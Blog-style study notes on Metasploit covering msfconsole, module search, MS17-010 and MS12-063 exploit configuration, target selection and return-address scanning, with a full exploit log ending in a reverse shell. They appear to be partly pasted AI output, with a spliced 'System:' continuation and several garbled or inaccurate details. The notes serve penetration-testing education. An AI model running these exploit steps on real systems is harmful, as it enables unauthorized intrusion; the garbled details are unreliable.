---
title: Metasploit
published: 2025-04-30
description: For My Reference
tags: [Notes]
category: Notes
author: Me
draft: false
---

# 7 - Metaspolit

## 1. A Word on Automated Tools

**Focus**: Explores the role of automated tools in the information security industry, addressing ongoing debates, benefits, drawbacks, and the importance of discipline in their use.

### Key Points with Explanations

- **Debates in the Industry**:
    - **Critics’ View**: Some security professionals argue that automated tools oversimplify penetration testing, making it too easy and reducing opportunities for analysts to demonstrate technical expertise. They believe manual exploitation showcases deeper skills and earns more respect in the community.
    - **Supporters’ View**: Newer professionals and advocates argue that tools are essential for learning and efficiency. They provide a user-friendly entry point for beginners to understand vulnerabilities and save time during assessments, allowing focus on complex tasks.
    - **Context**: These debates often surface on social media and forums, reflecting differing priorities between proving individual skill and delivering practical results.
- **Benefits of Automated Tools**:
    - **Simplified Vulnerability Interaction**: Tools abstract complex processes, enabling quick identification and exploitation of common vulnerabilities (e.g., unpatched software).
    - **Time Efficiency**: In fast-paced assessments, tools handle repetitive tasks, freeing analysts to tackle intricate issues like privilege escalation or custom exploits.
    - **Learning Aid**: For beginners, tools offer a structured way to explore vulnerabilities, building confidence and foundational knowledge.
- **Drawbacks of Automated Tools**:
    - **Comfort Zone Risk**: Over-reliance can create a dependency, where users avoid learning manual techniques or exploring beyond the tool’s capabilities. This stifles skill growth.
    - **Security Risks from Public Availability**: Tools released publicly (e.g., NSA’s Ghidra or other security tools) can be accessed by malicious actors with minimal expertise, increasing the risk of cyberattacks by “script kiddies.”
    - **Tunnel Vision Effect**: Users may assume a tool covers all possible vulnerabilities, limiting creative problem-solving. If the tool fails to identify an issue, the user might overlook it entirely.
- **Discipline in Tool Use**:
    - **Time Constraints**: Security assessments are often time-bound due to client budgets. Tools help prioritize high-impact vulnerabilities (e.g., those with severe consequences or easy fixes) to maximize value.
    - **Credibility Focus**: Clients care about results, not whether tools or manual methods were used. Effective outcomes build trust, regardless of the approach.
    - **Self-Improvement**: The document emphasizes focusing on personal growth over seeking validation from the infosec community. Mastery of tools and manual skills naturally leads to recognition.
    - **Analogy**: Like artists who lose focus chasing online likes, security professionals should prioritize their craft over external approval.

### Practical Tips

- **Balance Tools and Manual Skills**: Use tools for speed but dedicate time to learning manual exploitation (e.g., crafting custom payloads) to avoid skill stagnation.
- **Mitigate Public Tool Risks**: Be cautious with publicly available tools; ensure they’re from trusted sources and monitor their use in your environment.
- **Prioritize High-Impact Issues**: In assessments, focus on vulnerabilities with the greatest potential damage or easiest remediation to deliver value under time constraints.
- **Continuous Learning**: Regularly challenge yourself to step outside your comfort zone by exploring new tools, techniques, or manual methods.

---

## 2. Metasploit Intro

**Focus**: Introduces the Metasploit Project, a Ruby-based penetration testing platform, covering its features, versions, architecture, and practical applications.

### Key Points with Explanations

- **Overview**:
    - **What is Metasploit?**: A modular, open-source platform for developing, testing, and executing exploit code. It includes a database of pre-built, tested exploits and tools for various security tasks.
    - **Core Functions**: Supports vulnerability testing, network enumeration, attack execution, and evasion techniques (e.g., bypassing antivirus).
    - **Modularity**: Exploits are organized as modules, making it easy to select and customize attacks for specific targets.
    - **Use Case**: Ideal for penetration testers and exploit developers needing a comprehensive, flexible environment.
- **Strengths**:
    - **Wide Target Range**: Supports numerous platforms, services, and versions, accessible with simple commands (e.g., targeting specific software vulnerabilities).
    - **Exploit + Payload Combo**: Combines exploits (to breach a system) with payloads (to gain access, e.g., a reverse shell), streamlining the attack process.
    - **Post-Exploitation Flexibility**: Allows seamless switching between compromised systems, similar to browser tabs, for efficient post-exploitation tasks (e.g., data collection, pivoting).
    - **Analogy**: Described as a “Swiss army knife” for penetration testing—not a cure-all but versatile enough for most common vulnerabilities.
- **Versions**:
    - **Metasploit Framework**: Free, open-source, command-line focused. Includes core features like `msfconsole`, modules, and plugins. Best for technical users comfortable with CLI.
    - **Metasploit Pro**: Paid version with advanced features, including:
        - **Task Chains**: Automate multi-step processes (e.g., scanning, exploiting, reporting).
        - **Social Engineering**: Tools for phishing and credential harvesting.
        - **Vulnerability Validation**: Confirms if vulnerabilities are exploitable.
        - **GUI**: Web-based interface for less CLI-savvy users.
        - **Quick Start Wizards**: Guided setups for common tasks.
        - **Nexpose Integration**: Combines with Rapid7’s vulnerability scanner for streamlined workflows.
        - **Pro Console**: Retains CLI functionality with added features.
- **Metasploit Pro Features** (Table from Document):

| Infiltrate | Collect Data | Remediate |
| --- | --- | --- |
| Manual Exploitation | Import and Scan Data | Bruteforce |
| Anti-virus Evasion | Discovery Scans | Task Chains |
| PS/ROS Evasion | Meta-Modules | Exploitation Workflow |
| Proxy Pivot | Nexpose Scan Integration | Session Rerun |
| Post-Exploitation |  | Task Replay |
| Session Clean-up |  | Project Sonar Integration |
| Credentials Reuse |  | Session Management |
| Social Engineering |  | Credential Management |
| Payload Generator |  | Team Collaboration |
| Quick Pen-testing |  | Web Interface |
| VPN Pivoting |  | Backup and Restore |
| Vulnerability Validation |  | Data Export |
| Phishing Wizard |  | Evidence Collection |
| Web App Testing |  | Reporting |
| Persistent Sessions |  | Tagging Data |
- **Metasploit Framework Console (msfconsole)**:
    - **Primary Interface**: The most popular and stable way to interact with Metasploit, offering access to nearly all features.
    - **Features**:
        - Command-line interface with tab completion and readline support for efficient navigation.
        - Executes external commands (e.g., nmap) within the console.
        - Centralized control for selecting modules, configuring exploits, and managing sessions.
    - **Learning Curve**: May seem complex initially, but mastering command syntax unlocks its power.
- **Architecture** (Location on ParrotOS: `/usr/share/metasploit-framework`):
    - **Base Files**:
        - **Data and Lib**: Core components for `msfconsole` functionality.
        - **Documentation**: Technical details and guides for the project.
    - **Modules**: Organized into categories for specific purposes:
        - **Auxiliary**: Scanning, enumeration, or non-exploitative tasks.
        - **Encoders**: Obfuscate payloads to evade detection.
        - **Evasion**: Bypass security controls (e.g., antivirus).
        - **Exploits**: Code to breach systems.
        - **Nops**: No-operation instructions for exploit reliability.
        - **Payloads**: Code executed post-exploit (e.g., shells).
        - **Post**: Post-exploitation tasks (e.g., data collection, privilege escalation).
    - **Plugins**: Extend functionality (e.g., `openvas.rb` for vulnerability scanning, `sqlmap.rb` for SQL injection). Can be loaded manually or automatically.
    - **Scripts**: Include Meterpreter (a powerful post-exploitation tool) and other utilities for automation.
    - **Tools**: Command-line utilities for exploits, payloads, password cracking, and reconnaissance.
- **Usability**:
    - Designed for ease of use, with intuitive console navigation improving the learning experience.
    - Session and job management mimics browser tabs, allowing multitasking across targets.

### Practical Tips

- **Start with msfconsole**: Use it for maximum control and access to features. Practice commands like `use`, `set`, and `exploit` in a lab.
- **Consider Metasploit Pro**: If budget allows, its GUI and automation features (e.g., task chains) are great for complex assessments or team collaboration.
- **Explore Modules**: Regularly check module categories (e.g., exploits, payloads) to match tasks. Use `search` in `msfconsole` to find relevant modules.
- **Update Regularly**: Run `msfupdate` to keep the exploit database current, ensuring access to the latest vulnerabilities.
- **Learn Architecture**: Familiarize yourself with file locations (e.g., modules, plugins) to customize or create new tools.
- **Experiment**: Test different modules and plugins in a safe environment to understand their capabilities and limitations.

---

## 3. MSF Console

**Focus**: Guides users on launching and using `msfconsole`, with emphasis on enumeration and the engagement structure for penetration testing.

### Key Points with Explanations

- **Launching msfconsole**:
    - **Availability**: Pre-installed on security-focused Linux distributions like Kali Linux and Parrot Security.
    - **Command**: Run `msfconsole` in a terminal. Displays a splash art (ASCII banner) and a command prompt (`msf >`).
    - **Options**: Supports switches for graphical displays or procedural settings (e.g., quiet mode, resource scripts).
    - **First Impression**: The interface may feel intimidating, but its power lies in its command-driven flexibility.
- **Enumeration**:
    - **Purpose**: Identify public-facing services (e.g., HTTP, FTP, SQL databases) on a target system and their versions.
    - **Importance**: Versions are critical, as unpatched or outdated services (e.g., old Apache versions) are common entry points for exploits.
    - **Process**: Use scanning tools (e.g., Metasploit’s auxiliary modules or nmap) to map services and check for vulnerabilities.
    - **Example**: Discovering an outdated SQL server version might lead to a known exploit in Metasploit’s database.
- **Engagement Structure**:
    - **Overview**: Metasploit organizes penetration testing into five phases, making it easier to select tools and workflows:
        1. **Enumeration**: Scan and identify services, versions, and vulnerabilities.
        2. **Preparation**: Configure exploits and payloads for the target (e.g., setting RHOST, PAYLOAD).
        3. **Exploitation**: Execute the attack to gain initial access.
        4. **Privilege Escalation**: Elevate access (e.g., from user to admin) using post-exploitation modules.
        5. **Post-Exploitation**: Perform tasks like data collection, pivoting to other systems, or maintaining persistent access.
    - **Subcategories**: Each phase includes specific tasks, such as Service Validation (verifying service versions) or Vulnerability Research (finding exploitable flaws).
    - **Benefit**: This structure provides a clear roadmap, ensuring thorough and organized assessments.
- **Learning Approach**:
    - **Experimentation**: Hands-on practice with `msfconsole` is crucial. Test modules, payloads, and plugins in lab environments to build confidence.
    - **Independent Analysis**: Review command outputs and results to understand how tools work and identify areas for improvement.
    - **Depth**: The document encourages digging into individual components (e.g., module options) to master the framework.

### Practical Tips

- **Master Enumeration**: Use auxiliary modules (e.g., `auxiliary/scanner/http/http_version`) to identify services. Cross-reference versions with exploit modules.
- **Follow Engagement Structure**: Organize tasks by phase to stay systematic. For example, don’t skip enumeration, as it informs all subsequent steps.
- **Practice Commands**: Learn key `msfconsole` commands:
    - `use <module>`: Select a module (e.g., `use exploit/windows/smb/ms17_010_eternalblue`).
    - `set <option>`: Configure options (e.g., `set RHOST 192.168.1.100`).
    - `exploit` or `run`: Execute the module.
    - `sessions`: Manage active connections.
- **Lab Testing**: Set up a virtual lab (e.g., using Metasploitable) to practice safely. Experiment with different services and exploits.
- **Document Findings**: Log `msfconsole` outputs and results for reference during assessments or to track learning progress.
- **Stay Curious**: Explore advanced features like Meterpreter or plugin integration to expand your capabilities.

---

## 4. Metasploit Modules

**Focus**: Explains the role of Metasploit modules, their organization, types, and how to search for, select, and customize them for specific penetration testing tasks.

### Key Points with Explanations

### Overview of Metasploit Modules

- **Definition**: Metasploit modules are pre-built scripts designed for specific purposes, such as exploiting vulnerabilities, scanning systems, or performing post-exploitation tasks. These scripts are tested and ready for use in real-world scenarios.
- **Purpose**: Modules automate complex tasks, enabling penetration testers to focus on strategy and analysis rather than writing exploits from scratch.
- **Proof-of-Concept (PoCs)**: Many modules are PoCs that demonstrate how to exploit known vulnerabilities. However, a failed exploit does not disprove a vulnerability’s existence—it may require customization for the target environment.
- **Role of Automation**: Modules are support tools, not replacements for manual skills. They streamline repetitive tasks but require user expertise to adapt to specific systems.

### Module Structure

- **Folder Organization**: Modules are organized in a hierarchical structure for easy navigation, following the syntax:
    
    ```
    <No.> <type>/<service>/<name>
    
    ```
    
    - **No.**: An index number assigned to each module, used for quick selection during searches (e.g., `use 794` instead of typing the full path).
    - **Type**: Indicates the module’s purpose (e.g., exploit, auxiliary).
    - **Service**: Specifies the targeted service or protocol (e.g., ftp, smb, http) or a general activity (e.g., gather for credential collection).
    - **Name**: Describes the specific action or vulnerability targeted (e.g., `scriptftp_list` for an FTP exploit).
- **Example**:
    
    ```
    794 exploit/windows/ftp/scriptftp_list
    
    ```
    
    - Index: 794
    - Type: Exploit
    - Service: FTP
    - Name: scriptftp_list
    - OS: Windows

### Module Types

Metasploit modules are categorized by their functionality. Not all types are directly exploitable, but each serves a specific role in the penetration testing workflow. The document lists the following types:

| **Type** | **Description** |
| --- | --- |
| **Auxiliary** | Supports scanning, fuzzing, sniffing, and administrative tasks. Provides extra functionality like enumeration or credential gathering. |
| **Encoders** | Obfuscates payloads to ensure they reach the target intact, evading detection mechanisms like antivirus software. |
| **Exploits** | Exploits vulnerabilities to deliver payloads, enabling initial access to a system. |
| **NOPs** | No Operation code used to maintain consistent payload sizes across exploit attempts, improving reliability. |
| **Payloads** | Code executed on the target post-exploitation, often establishing a connection back to the attacker (e.g., reverse shell). |
| **Plugins** | Additional scripts that integrate with msfconsole, enhancing functionality (e.g., vulnerability scanning integrations). |
| **Post** | Modules for post-exploitation tasks, such as gathering information, pivoting, or escalating privileges. |
- **Interactable Modules**: Only **Auxiliary**, **Exploits**, and **Posteditorial** modules can be initiated directly using the `use <module>` command. These are the primary modules for active tasks like scanning, exploiting, or post-exploitation.
- **Non-Interactable Modules**: **Encoders**, **NOPs**, **Payloads**, and **Plugins** support other modules but are not directly selectable via `use`. They are used as part of the exploit or payload delivery process.

### Module Tags

Modules are further classified by additional tags to help identify their applicability:

- **OS**: Specifies the target operating system and architecture (e.g., Windows, Linux, x86, x64). Different OSes require tailored code.
- **Service**: Identifies the vulnerable service or protocol (e.g., smb, ftp) or a general activity (e.g., gather for credential collection).
- **Name**: Describes the specific action or vulnerability targeted by the module.

### Searching for Modules

- **Search Seven Search Function**: Metasploit provides a robust search function to find modules based on specific criteria.
- **Syntax**:
    
    ```
    search [<options>] [<keywords>:<value>]
    
    ```
    
- **Options**:
    - `h`: Show help information.
    - `o <file>`: Output results to a CSV file.
    - `S <string>`: Filter results using a regex pattern.
    - `u`: Automatically use the module if there’s only one result.
    - `s <search_column>`: Sort results by a specific column (e.g., rank, name).
    - `r`: Reverse the sort order (descending).
- **Keywords**: Include `aka`, `author`, `arch`, `bid`, `cve`, `edb`, `check`, `date`, `description`, `fullname`, `mod_time`, `name`, `path`, `platform`, `port`, `rank`, `ref`, `reference`, `target`, `type`.
- **Supported Search Columns**: `rank`, `date` (or `disclosure_date`), `name`, `type`, `check`.
- **Examples**:
    
    ```
    search cve:2009 type:exploit
    search cve:2009 type:exploit platform:-linux
    search cve:2009 -s name
    search type:exploit -s type -r
    
    ```
    
- **Example Search for EternalRomance**:
    
    ```
    msf6 > search eternal romance
    Matching Modules
    Name                                      Disclosure Date  Rank    Check  Description
    0 exploit/windows/smb/ms17_010_psexec      2017-03-14       normal  yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
    1 auxiliary/admin/smb/ms17_010_command     2017-03-14       normal  yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
    
    ```
    

### Selecting and Customizing Modules

- **Selecting a Module**:
    - Use the index number or full path:
    or
        
        ```
        msf6 > use 0
        
        ```
        
        ```
        msf6 > use exploit/windows/smb/ms17_010_psexec
        
        ```
        
- **Viewing Module Information**:
    - Use the `info` command to display details about the module:
        
        ```
        msf6 exploit(windows/smb/ms17_010_psexec) > info
        
        ```
        
        - **Output Includes**:
            - Name, module path, platform (e.g., Windows), architecture (e.g., x86, x64).
            - Privileged status, license, rank (e.g., normal), disclosure date.
            - Authors, available targets, check support, basic options, payload information, description, references, and aliases (e.g., ETERNALSYNERGY, ETERNALROMANCE).
- **Customizing Module Options**:
    - Use the `set` or `setg` (global) command to configure module options:
        
        ```
        msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
        RHOSTS => 10.10.10.40
        msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
        LHOST => 10.10.14.15
        
        ```
        
    - **Common Options** (for `ms17_010_psexec`):
        - **RHOSTS**: Target IP address(es).
        - **RPORT**: Target port (default: 445 for SMB).
        - **LHOST**: Attacker’s IP address for reverse connections.
        - **LPORT**: Attacker’s listening port (default: 4444).
        - **SHARE**: SMB share to connect to (e.g., ADMIN$).
        - **SMBDomain**, **SMBUser**, **SMBPass**: Credentials for authenticated access.
        - **NAMEDPIPE**, **NAMED_PIPES**: Named pipe settings for exploitation.
        - **LEAKATTEMPTS**: Number of memory leak attempts (default: 99).
        - **DBGTRACE**: Enable debug tracing (default: false).
- **Viewing Options**:
    - Use the `options` command to display current settings:
        
        ```
        msf6 exploit(windows/smb/ms17_010_psexec) > options
        
        ```
        

### Executing the Exploit

- **Running the Exploit**:
    - Use the `exploit` or `run` command to execute the module:
        
        ```
        msf6 exploit(windows/smb/ms17_010_psexec) > exploit
        
        ```
        
    - **Example Output** (for `ms17_010_psexec`):
        
        ```
        [*] Started reverse TCP handler on 10.10.14.15:4444
        [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
        [*] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional
        [*] 10.10.10.40:445 - Connecting to target for exploitation.
        [*] 10.10.10.40:445 - Connection established for exploitation.
        [*] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
        [*] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
        [*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
        [*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
        [*] 10.10.10.40:445 - Starting non-paged pool grooming
        [*] 10.10.10.40:445 - Sending SMBv2 buffers
        [*] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer
        [*] 10.10.10.40:445 - Sending final SMBv2 buffers.
        [*] 10.10.10.40:445 - Sending last fragment of exploit packet!
        [*] 10.10.10.40:445 - Receiving response from exploit packet
        [*] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC0000000D)!
        [*] 10.10.10.40:445 - Sending egg to corrupted connection.
        [*] 10.10.10.40:445 - Triggering free of corrupted buffer.
        [*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13
        
        ```
        
    - **Result**: Successfully opens a command shell session, indicating the exploit worked and a connection was established.

### Module-Specific Details (MS17-010 Example)

- **Description**: The `exploit/windows/smb/ms17_010_psexec` module exploits vulnerabilities in Microsoft’s SMB protocol (MS17-010), affecting Windows systems. It uses a write-what-where primitive to overwrite session information, granting Administrator-level access, followed by standard psexec payload execution.
- **Vulnerabilities Exploited**:
    - Type confusion between Transaction and WriteAndX requests.
    - Race condition in Transaction requests.
- **Exploit Chain**: Combines EternalRomance, EternalSynergy, and EternalChampion techniques. More reliable than EternalBlue but requires a named pipe.
- **References**:
    - Microsoft Security Bulletin: [MS17-010](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010)
    - CVE IDs: [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/CVE-2017-0143), [CVE-2017-0146](https://nvd.nist.gov/vuln/detail/CVE-2017-0146), [CVE-2017-0147](https://nvd.nist.gov/vuln/detail/CVE-2017-0147)
    - External Resources: GitHub repositories, HITCON slides, and Microsoft SRD blog posts.

### Practical Tips for Using Metasploit Modules

1. **Understand Module Requirements**:
    - Check the `info` output for supported platforms, architectures, and required options.
    - Ensure the target matches the module’s OS and service specifications (e.g., Windows SMB for MS17-010).
2. **Customize Carefully**:
    - Set mandatory options like `RHOSTS` and `LHOST` accurately.
    - Adjust optional settings (e.g., `LEAKATTEMPTS`, `NAMEDPIPE`) based on target behavior or network conditions.
3. **Verify Vulnerabilities**:
    - Use auxiliary modules (e.g., `auxiliary/scanner/smb/smb_ms17_010`) to confirm the target is vulnerable before running exploits.
    - Example: The MS17-010 exploit checks for vulnerability during execution, as shown in the output.
4. **Test in a Lab**:
    - Practice exploiting vulnerabilities like MS17-010 on virtual machines (e.g., Metasploitable3 or a Windows 7 VM) to avoid real-world harm.
    - Use tools like VirtualBox or VMware to set up safe environments.
5. **Handle Failures**:
    - If an exploit fails, review the error messages in the console output.
    - Adjust options (e.g., increase `LEAKATTEMPTS`, change `RPORT`), verify the target’s configuration, or try alternative modules.
6. **Search Efficiently**:
    - Use specific keywords (e.g., `cve:2017-0143 type:exploit`) to narrow down results.
    - Exclude irrelevant platforms with negative filters (e.g., `platform:-linux`).
7. **Monitor Sessions**:
    - After a successful exploit, use the `sessions` command to interact with the compromised system:
        
        ```
        msf6 > sessions
        
        ```
        
        - Switch to the session for post-exploitation tasks:
            
            ```
            msf6 > sessions -i 1
            
            ```
            
8. **Stay Updated**:
    - Run `msfupdate` to ensure the latest modules and exploits are available.
    - Monitor CVE databases or security bulletins for new vulnerabilities to target.
9. **Document Everything**:
    - Save search results or console output to a file (e.g., `search -o results.csv`).
    - Log session details and exploited vulnerabilities for reporting or learning purposes.
10. **Combine with Manual Skills**:
    - Use Metasploit to automate initial exploitation, but manually verify results (e.g., check for named pipes or SMB shares).
    - Learn the underlying exploit mechanics (e.g., SMB protocol flaws in MS17-010) to customize or troubleshoot effectively.

### Additional Notes

- **Why Modules Matter**: Metasploit modules are the backbone of the framework, providing a structured way to exploit vulnerabilities, enumerate systems, and perform post-exploitation tasks. Mastering their use enhances efficiency and effectiveness in penetration testing.
- **Real-World Application**: Modules like `ms17_010_psexec` target high-impact vulnerabilities (e.g., those exploited in WannaCry and NotPetya attacks). Understanding their mechanics prepares testers for real-world scenarios.
- **Ethical Considerations**: Only use Metasploit in authorized environments (e.g., client engagements or personal labs). Unauthorized use is illegal and harmful.
- **Next Steps**:
    - Set up a lab with vulnerable systems (e.g., Windows 7 for MS17-010 testing).
    - Practice searching for and exploiting other vulnerabilities (e.g., CVE-2008-4250 for SMB or CVE-2014-0160 for Heartbleed).
    - Explore post-exploitation modules (e.g., `post/windows/gather/hashdump`) to deepen skills.

---

## 5. Metasploit Targets

**Focus**: Explains the role of targets in Metasploit, how they relate to specific operating system versions, and the process of selecting and identifying appropriate targets for exploit modules.

### Key Points with Explanations

### Overview of Targets

- **Definition**: Targets are unique identifiers for specific operating system versions and configurations that an exploit module is designed to exploit. They ensure the exploit is tailored to the target’s environment, accounting for differences in OS version, service pack, architecture, or language pack.
- **Purpose**: Targets adapt the exploit’s code to the memory layout, return addresses, or other system-specific parameters of the vulnerable system, increasing the likelihood of successful exploitation.
- **Command**: The `show targets` command displays the available targets for a selected exploit module. Without an exploit module selected, it returns an error:
    
    ```
    msf6 > show targets
    [-] No exploit module selected.
    
    ```
    

### Displaying Targets for an Exploit

- **Within an Exploit Module**: When an exploit module is selected, `show targets` lists all vulnerable operating systems or configurations supported by that module.
- **Example with MS17-010**:
    
    ```
    msf6 exploit(windows/smb/ms17_010_psexec) > show targets
    Exploit targets:
    Id  Name
    --  ----
    0   Automatic
    
    ```
    
    - **Observation**: The `ms17_010_psexec` module has only one target, "Automatic," indicating it dynamically adapts to the target system (e.g., Windows versions vulnerable to MS17-010, such as Windows 7 or Server 2008).
- **Example with MS12-063**:
    - Module: `exploit/windows/browser/ie_execcommand_uaf` (targets the MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability).
    - Command:
        
        ```
        msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
        Exploit targets:
        Id  Name
        --  ----
        0   Automatic
        1   IE 7 on Windows XP SP3
        2   IE 8 on Windows XP SP3
        3   IE 7 on Windows Vista
        4   IE 8 on Windows Vista
        5   IE 8 on Windows 7
        6   IE 9 on Windows 7
        
        ```
        
    - **Observation**: This module supports multiple specific targets, each corresponding to a combination of Internet Explorer version and Windows operating system. The "Automatic" option attempts to detect the target dynamically, but manual selection is often more reliable for precise environments.

### Selecting a Target

- **Command**: Use the `set target <Id>` command to select a specific target by its ID.
- **Example**:
    
    ```
    msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
    target => 6
    
    ```
    
    - **Result**: Selects "IE 9 on Windows 7" as the target, configuring the exploit to use parameters (e.g., return addresses) specific to that environment.
- **Automatic vs. Manual Selection**:
    - **Automatic**: The exploit attempts to fingerprint the target system and select the appropriate configuration. Useful for quick tests but less reliable in complex or non-standard environments.
    - **Manual**: Explicitly selecting a target (e.g., ID 6) ensures the exploit uses predefined settings for that OS and application version, reducing the risk of failure due to misidentification.

### Understanding Target Variability

- **Factors Affecting Targets**:
    - **Operating System Version**: Different OS versions (e.g., Windows XP vs. Windows 7) have distinct memory layouts and system libraries.
    - **Service Pack**: Updates like Windows XP SP3 may patch vulnerabilities or shift memory addresses.
    - **Language Pack**: Language-specific versions of software can alter memory addresses due to differences in string lengths or character encoding.
    - **Software Version**: Variations in the target application (e.g., IE 7 vs. IE 9) affect the exploit’s behavior.
    - **Hooks or Protections**: Security mechanisms (e.g., DEP, ASLR) or third-party hooks may shift memory addresses, requiring specific return addresses.
- **Return Addresses**:
    - A **return address** is a memory address used by the exploit to redirect execution to the payload or other malicious code.
    - Types of return addresses:
        - **jmp esp**: Jumps to the stack pointer, often used in stack-based buffer overflows.
        - **pop pop ret**: A sequence that pops two values off the stack and returns, commonly used in SEH (Structured Exception Handler) exploits.
        - **Custom**: Specific addresses tailored to the target’s binaries or libraries.
    - **Variability**: Return addresses differ across OS versions, service packs, or language packs due to changes in binary code or memory layout.
    - **Source**: For detailed study, refer to the "Stack-Based Buffer Overflows on Windows x86" module mentioned in the document.

### Identifying Targets

- **Steps to Identify a Target**:
    1. **Obtain Target Binaries**: Acquire a copy of the target system’s binaries (e.g., DLLs or executables like `mshtml.dll` for Internet Explorer). This can be done by:
        - Setting up a virtual machine with the exact OS and software version.
        - Extracting binaries from a test system or public sources (e.g., Microsoft’s symbol server).
    2. **Use msfpescan**: Metasploit’s `msfpescan` tool scans binaries to locate suitable return addresses (e.g., `jmp esp` or `pop pop ret`) for exploitation.
        - Example:
            
            ```
            msfpescan -p mshtml.dll
            
            ```
            
            - Output: Lists potential return addresses compatible with the exploit.
    3. **Analyze Exploit Code**: Check the exploit module’s source code (e.g., in `/usr/share/metasploit-framework/modules/exploits/`) for comments or target definitions that specify return addresses or other parameters.
- **Practical Example**:
    - For `ie_execcommand_uaf`, the exploit may define return addresses for each target (e.g., IE 9 on Windows 7) in its Ruby code. Reviewing the module’s code reveals how targets are differentiated (e.g., by `mshtml.dll` version or memory offsets).

### Module Information

- **Command**: Use the `info` command to view detailed information about the exploit module, including its targets, requirements, and functionality.
- **Example**:
    
    ```
    msf6 exploit(windows/browser/ie_execcommand_uaf) > info
    Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability
    Module: exploit/windows/browser/ie_execcommand_uaf
    Platform: Windows
    Arch:
    Privileged: No
    License: Metasploit Framework License (BSD)
    Rank: Good
    Disclosed: 2012-09-14
    Provided by:
      unknown
      eromang
      binjo
      sinn3r <sinn3r@metasploit.com>
      juan.vazquez <juan.vazquez@metasploit.com>
    Available targets:
      Id  Name
      --  ----
      0   Automatic
      1   IE 7 on Windows XP SP3
      2   IE 8 on Windows XP SP3
      3   IE 7 on Windows Vista
      4   IE 8 on Windows Vista
      5   IE 8 on Windows 7
      6   IE 9 on Windows 7
    Check supported: No
    Basic options:
      Name        Current Setting  Required  Description
      ----        ---------------  --------  -----------
      OBFUSCATE   false            no        Enable JavaScript obfuscation
      SRVHOST     0.0.0.0          yes       The local host to listen on
      SRVPORT     8080             yes       The local port to listen on
      SSL         false            no        Negotiate SSL for incoming connections
      SSLCert                      no        Path to a custom SSL certificate
      URIPATH                      no        The URI to use for this exploit
    Description:
      This module exploits a use-after-free vulnerability in Microsoft Internet
      Explorer. The vulnerability occurs when the execCommand function improperly
      handles memory, allowing an attacker to execute arbitrary code...
    References:
      - CVE-2012-4969
      - MS12-063
      - <https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/ms12-063>
    
    ```
    
- **Key Insights**:
    - **Vulnerability**: Exploits a use-after-free bug in Internet Explorer’s `execCommand` function, allowing arbitrary code execution.
    - **Platform**: Windows only, with specific targets for XP, Vista, and 7.
    - **Options**:
        - `SRVHOST` and `SRVPORT`: Configure the exploit’s web server (default: port 8080).
        - `OBFUSCATE`: Enables JavaScript obfuscation to evade detection.
        - `URIPATH`: Customizes the URL path for the malicious page.
    - **References**: Links to CVE-2012-4969 and Microsoft’s MS12-063 bulletin for further reading.
    - **Check Support**: Not supported, meaning the module cannot automatically verify if the target is vulnerable (manual reconnaissance required).

### Practical Tips for Working with Targets

1. **Always Check Targets**:
    - Run `show targets` after selecting an exploit to understand the supported OS and application versions.
    - Compare the target list with reconnaissance data (e.g., OS version, browser version) gathered via tools like Nmap or manual enumeration.
2. **Use `info` First**:
    - Before running an exploit, use the `info` command to review the module’s description, targets, and options.
    - Verify the module’s rank (e.g., “Good” for `ie_execcommand_uaf`) and disclosure date to assess reliability.
3. **Manual Target Selection**:
    - Prefer manual target selection (e.g., `set target 6`) when the target’s OS and software versions are known.
    - Use “Automatic” only for initial testing or when target details are uncertain.
4. **Reconnaissance is Critical**:
    - Use auxiliary modules (e.g., `auxiliary/scanner/http/http_version`) or external tools to identify the target’s OS, service pack, and browser version.
    - Example: For `ie_execcommand_uaf`, confirm the IE version via HTTP headers or JavaScript fingerprinting.
5. **Test in a Lab**:
    - Set up virtual machines with specific configurations (e.g., Windows 7 with IE 9–

System: I apologize for the interruption. It seems the response was cut off. Let me continue and complete the detailed reference notes on Metasploit Framework Targets based on the provided document, "5 MSF Targets.pdf".

---

### Continuation of Detailed Reference Notes on Metasploit Framework Targets

### Practical Tips for Working with Targets (Continued)

1. **Test in a Lab** (Continued):
    - Set up virtual machines with specific configurations (e.g., Windows 7 with IE 9) to test exploits safely.
    - Use tools like VirtualBox or VMware to replicate target environments, ensuring the OS version, service pack, and software match the exploit’s requirements.
    - Example: For `ie_execcommand_uaf`, create VMs for Windows XP SP3 (IE 7/8), Windows Vista (IE 7/8), and Windows 7 (IE 8/9) to practice target selection and exploitation.
2. **Analyze Return Addresses**:
    - If an exploit fails, check the module’s source code (located in `/usr/share/metasploit-framework/modules/exploits/`) for target-specific return addresses.
    - Use `msfpescan` to verify or find alternative return addresses in the target’s binaries:
        
        ```
        msfpescan -j esp mshtml.dll
        
        ```
        
        - This scans `mshtml.dll` for `jmp esp` instructions, which are critical for exploits like `ie_execcommand_uaf`.
    - Cross-reference findings with the module’s comments to ensure compatibility.
3. **Handle Language Packs and Variants**:
    - Be aware that language packs or regional settings can shift memory addresses, requiring a different target or custom return address.
    - If the target uses a non-English OS, test the exploit in a matching environment or adjust the return address manually (advanced users).
4. **Combine with Reconnaissance**:
    - Use auxiliary modules to gather target details before selecting a target. For example:
        
        ```
        use auxiliary/scanner/http/http_version
        set RHOSTS <target_ip>
        run
        
        ```
        
        - This identifies the web server and potentially the browser version, aiding in target selection for browser-based exploits like `ie_execcommand_uaf`.
5. **Customize Exploit Options**:
